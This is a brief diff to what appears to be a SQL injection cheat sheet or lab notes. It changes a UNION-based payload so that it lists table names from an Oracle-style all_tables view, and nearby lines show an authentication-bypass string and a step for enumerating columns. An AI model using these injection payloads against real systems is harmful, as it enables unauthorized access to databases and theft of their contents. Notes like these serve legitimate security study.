@@ -39,7 +39,7 @@ administrator'--
 ```
   - Retrieve the list of tables in the database
 ```
-'+UNION+SELECT+dual,NULL+FROM+all_tables--
+'+UNION+SELECT+table_name,NULL+FROM+all_tables--
 ```
   - Retrive the details of the columns in the table (replace the table name)
 ```
